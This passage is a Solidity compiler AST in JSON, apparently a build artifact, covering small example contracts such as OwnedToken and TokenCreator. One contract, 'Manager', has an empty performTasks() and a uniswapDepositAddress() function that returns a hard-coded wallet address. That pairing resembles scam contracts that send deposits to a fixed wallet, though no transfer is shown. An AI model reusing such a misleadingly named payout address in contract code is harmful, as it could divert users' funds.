									"typeName": {
										"id": 1752,
										"keyType": {
											"id": 1750,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "1244:7:4",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "1235:25:4",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 1751,
											"name": "uint",
											"nodeType": "ElementaryTypeName",
											"src": "1255:4:4",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1761,
									"name": "Sent",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1760,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1755,
												"indexed": false,
												"mutability": "mutable",
												"name": "from",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1761,
												"src": "1371:12:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1754,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1371:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1757,
												"indexed": false,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1761,
												"src": "1385:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1756,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1385:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1759,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1761,
												"src": "1397:11:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1758,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1397:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1370:39:4"
									},
									"src": "1360:50:4"
								}
							],
							"scope": 1880,
							"src": "787:1785:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1775,
							"linearizedBaseContracts": [
								1775
							],
							"name": "C",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 1764,
									"mutability": "mutable",
									"name": "data",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1775,
									"src": "3061:17:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 1763,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "3061:4:4",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1773,
										"nodeType": "Block",
										"src": "3186:13:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1771,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1769,
														"name": "data",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1764,
														"src": "3188:4:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1770,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1766,
														"src": "3195:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3188:8:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1772,
												"nodeType": "ExpressionStatement",
												"src": "3188:8:4"
											}
										]
									},
									"documentation": null,
									"functionSelector": "5b4b73a9",
									"id": 1774,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "setData",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1767,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1766,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1774,
												"src": "3171:6:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1765,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "3171:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3170:8:4"
									},
									"returnParameters": {
										"id": 1768,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3186:0:4"
									},
									"scope": 1775,
									"src": "3154:45:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 1880,
							"src": "3043:303:4"
						},
						{
							"abstract": false,
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1776,
										"name": "C",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1775,
										"src": "3698:1:4",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_C_$1775",
											"typeString": "contract C"
										}
									},
									"id": 1777,
									"nodeType": "InheritanceSpecifier",
									"src": "3698:1:4"
								}
							],
							"contractDependencies": [
								1775
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1778,
							"linearizedBaseContracts": [
								1778,
								1775
							],
							"name": "E",
							"nodeType": "ContractDefinition",
							"nodes": [],
							"scope": 1880,
							"src": "3684:201:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1825,
							"linearizedBaseContracts": [
								1825
							],
							"name": "OwnedToken",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 1780,
									"mutability": "mutable",
									"name": "creator",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1825,
									"src": "4153:20:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_TokenCreator_$1866",
										"typeString": "contract TokenCreator"
									},
									"typeName": {
										"contractScope": null,
										"id": 1779,
										"name": "TokenCreator",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1866,
										"src": "4153:12:4",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_TokenCreator_$1866",
											"typeString": "contract TokenCreator"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 1782,
									"mutability": "mutable",
									"name": "owner",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1825,
									"src": "4180:13:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 1781,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "4180:7:4",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 1784,
									"mutability": "mutable",
									"name": "name",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1825,
									"src": "4200:12:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes32",
										"typeString": "bytes32"
									},
									"typeName": {
										"id": 1783,
										"name": "bytes32",
										"nodeType": "ElementaryTypeName",
										"src": "4200:7:4",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes32",
											"typeString": "bytes32"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1805,
										"nodeType": "Block",
										"src": "4514:669:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1792,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1789,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1782,
														"src": "4708:5:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1790,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": -15,
															"src": "4716:3:4",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 1791,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "4716:10:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "4708:18:4",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 1793,
												"nodeType": "ExpressionStatement",
												"src": "4708:18:4"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1799,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1794,
														"name": "creator",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1780,
														"src": "5118:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_TokenCreator_$1866",
															"typeString": "contract TokenCreator"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1796,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "5141:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 1797,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "5141:10:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															],
															"id": 1795,
															"name": "TokenCreator",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1866,
															"src": "5128:12:4",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_TokenCreator_$1866_$",
																"typeString": "type(contract TokenCreator)"
															}
														},
														"id": 1798,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "5128:24:4",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_TokenCreator_$1866",
															"typeString": "contract TokenCreator"
														}
													},
													"src": "5118:34:4",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_TokenCreator_$1866",
														"typeString": "contract TokenCreator"
													}
												},
												"id": 1800,
												"nodeType": "ExpressionStatement",
												"src": "5118:34:4"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1803,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1801,
														"name": "name",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1784,
														"src": "5163:4:4",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1802,
														"name": "_name",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1786,
														"src": "5170:5:4",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"src": "5163:12:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"id": 1804,
												"nodeType": "ExpressionStatement",
												"src": "5163:12:4"
											}
										]
									},
									"documentation": null,
									"id": 1806,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1787,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1786,
												"mutability": "mutable",
												"name": "_name",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1806,
												"src": "4493:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1785,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "4493:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4492:15:4"
									},
									"returnParameters": {
										"id": 1788,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4514:0:4"
									},
									"scope": 1825,
									"src": "4481:702:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1823,
										"nodeType": "Block",
										"src": "5235:855:4",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													},
													"id": 1817,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1811,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": -15,
															"src": "6023:3:4",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 1812,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "6023:10:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 1815,
																"name": "creator",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1780,
																"src": "6045:7:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_TokenCreator_$1866",
																	"typeString": "contract TokenCreator"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_TokenCreator_$1866",
																	"typeString": "contract TokenCreator"
																}
															],
															"id": 1814,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "6037:7:4",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": {
																"id": 1813,
																"name": "address",
																"nodeType": "ElementaryTypeName",
																"src": "6037:7:4",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 1816,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "6037:16:4",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "6023:30:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1822,
												"nodeType": "IfStatement",
												"src": "6019:63:4",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1820,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1818,
															"name": "name",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1784,
															"src": "6068:4:4",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"id": 1819,
															"name": "newName",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1808,
															"src": "6075:7:4",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														},
														"src": "6068:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"id": 1821,
													"nodeType": "ExpressionStatement",
													"src": "6068:14:4"
												}
											}
										]
									},
									"documentation": null,
									"functionSelector": "898855ed",
									"id": 1824,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "changeName",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1809,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1808,
												"mutability": "mutable",
												"name": "newName",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1824,
												"src": "5211:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1807,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "5211:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5210:17:4"
									},
									"returnParameters": {
										"id": 1810,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5235:0:4"
									},
									"scope": 1825,
									"src": "5191:899:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 1880,
							"src": "3889:3086:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1838,
							"linearizedBaseContracts": [
								1838
							],
							"name": "Manager",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 1828,
										"nodeType": "Block",
										"src": "7029:12:4",
										"statements": []
									},
									"documentation": null,
									"functionSelector": "0c0f93a1",
									"id": 1829,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "performTasks",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1826,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7019:2:4"
									},
									"returnParameters": {
										"id": 1827,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7029:0:4"
									},
									"scope": 1838,
									"src": "6998:43:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1836,
										"nodeType": "Block",
										"src": "7109:59:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "307838633362434634453139393936454465433131623566303532334336613031353161373564333531",
													"id": 1834,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "7121:42:4",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													},
													"value": "0x8c3bCF4E19996EDeC11b5f0523C6a0151a75d351"
												},
												"functionReturnParameters": 1833,
												"id": 1835,
												"nodeType": "Return",
												"src": "7114:49:4"
											}
										]
									},
									"documentation": null,
									"functionSelector": "feae9ad3",
									"id": 1837,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "uniswapDepositAddress",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1830,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7076:2:4"
									},
									"returnParameters": {
										"id": 1833,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1832,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1837,
												"src": "7100:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1831,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7100:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7099:9:4"
									},
									"scope": 1838,
									"src": "7046:122:4",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 1880,
							"src": "6977:194:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [
								1825
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1866,
							"linearizedBaseContracts": [
								1866
							],
							"name": "TokenCreator",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 1850,
										"nodeType": "Block",
										"src": "7299:441:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1847,
															"name": "name",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1840,
															"src": "7727:4:4",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 1846,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "7712:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_creation_nonpayable$_t_bytes32_$returns$_t_contract$_OwnedToken_$1825_$",
															"typeString": "function (bytes32) returns (contract OwnedToken)"
														},
														"typeName": {
															"contractScope": null,
															"id": 1845,
															"name": "OwnedToken",
															"nodeType": "UserDefinedTypeName",
															"referencedDeclaration": 1825,
															"src": "7716:10:4",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_OwnedToken_$1825",
																"typeString": "contract OwnedToken"
															}
														}
													},
													"id": 1848,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7712:20:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_OwnedToken_$1825",
														"typeString": "contract OwnedToken"
													}
												},
												"functionReturnParameters": 1844,
												"id": 1849,
												"nodeType": "Return",
												"src": "7705:27:4"
											}
										]
									},
									"documentation": null,
									"functionSelector": "ae3edb65",
									"id": 1851,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "createToken",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1841,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1840,
												"mutability": "mutable",
												"name": "name",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1851,
												"src": "7223:12:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1839,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "7223:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7222:14:4"
									},
									"returnParameters": {
										"id": 1844,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1843,
												"mutability": "mutable",
												"name": "tokenAddress",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1851,
												"src": "7269:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_contract$_OwnedToken_$1825",
													"typeString": "contract OwnedToken"
												},
												"typeName": {
													"contractScope": null,
													"id": 1842,
													"name": "OwnedToken",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 1825,
													"src": "7269:10:4",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_OwnedToken_$1825",
														"typeString": "contract OwnedToken"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7268:25:4"
									},
									"scope": 1866,
									"src": "7202:538:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1864,
										"nodeType": "Block",
										"src": "7815:357:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1861,
															"name": "name",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1855,
															"src": "8159:4:4",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1858,
															"name": "tokenAddress",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1853,
															"src": "8135:12:4",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_OwnedToken_$1825",
																"typeString": "contract OwnedToken"
															}
														},
														"id": 1860,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "changeName",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 1824,
														"src": "8135:23:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bytes32_$returns$__$",
															"typeString": "function (bytes32) external"
														}
													},
													"id": 1862,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8135:29:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1863,
												"nodeType": "ExpressionStatement",
												"src": "8135:29:4"
											}
										]
									},
									"documentation": null,
									"functionSelector": "7379b422",
									"id": 1865,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "changeName",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1856,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1853,
												"mutability": "mutable",
												"name": "tokenAddress",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1865,
												"src": "7768:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_contract$_OwnedToken_$1825",
													"typeString": "contract OwnedToken"
												},
												"typeName": {
													"contractScope": null,
													"id": 1852,
													"name": "OwnedToken",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 1825,
													"src": "7768:10:4",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_OwnedToken_$1825",
														"typeString": "contract OwnedToken"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1855,
												"mutability": "mutable",
												"name": "name",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1865,
												"src": "7793:12:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1854,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "7793:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7767:39:4"
									},
									"returnParameters": {
										"id": 1857,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7815:0:4"
									},
									"scope": 1866,
									"src": "7748:424:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 1880,
							"src": "7173:1825:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1879,
							"linearizedBaseContracts": [
								1879
							],
							"name": "arrayExample",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "cc3e57d9",
									"id": 1869,
									"mutability": "mutable",
									"name": "myArray",
									"nodeType": "VariableDeclaration",
